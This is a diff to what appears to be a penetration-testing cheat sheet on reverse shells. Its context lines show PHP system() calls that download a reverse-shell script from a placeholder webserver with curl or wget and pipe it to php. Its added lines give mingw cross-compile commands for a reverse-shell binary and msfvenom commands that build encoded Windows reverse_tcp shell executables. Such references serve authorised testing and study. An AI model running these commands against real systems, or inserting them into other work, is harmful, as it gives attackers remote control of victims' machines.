@@ -203,8 +203,9 @@ system('curl http://<WEBSERVER_IP>:<WEBSERVER_PORT>/php-reverse-shell.php | php'
 system('wget -qO- http://<WEBSERVER_IP>:<WEBSERVER_PORT>/php-reverse-shell.php | php')
 ```
 
-
 #### Binary
+
+###### Compiled one-liner
 
 If reverse shell must be made through a binary the following c code can be used:
 
@@ -220,6 +221,29 @@ int main() {
 
 The binary must be compiled on the same architecture as the target (advised to
 use the same OS and kernel for Linux targets).
+
+To compile for a Windows target on Linux use the cross-compiler mingw:
+
+```
+# 32 bits
+i686-w64-mingw32-gcc -o test.exe test.c
+
+# 64 bits
+x86_64-w64-mingw32-gcc -o test.exe test.c
+```
+
+###### msfvenom reverse shell binary
+
+msfvenom can be used to create a reverse shell binary:
+
+```
+# 32 bits
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -b "\x00" -e x86/shikata_ga_nai -f exe -o <OUTBIN.exe>
+
+# 64 bits
+msfvenom -a x64 --platform windows -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -b "\x00" -e x86/shikata_ga_nai -f exe -o <OUTBIN.exe>
+```
+
 
 #### (Optional) TTY
 
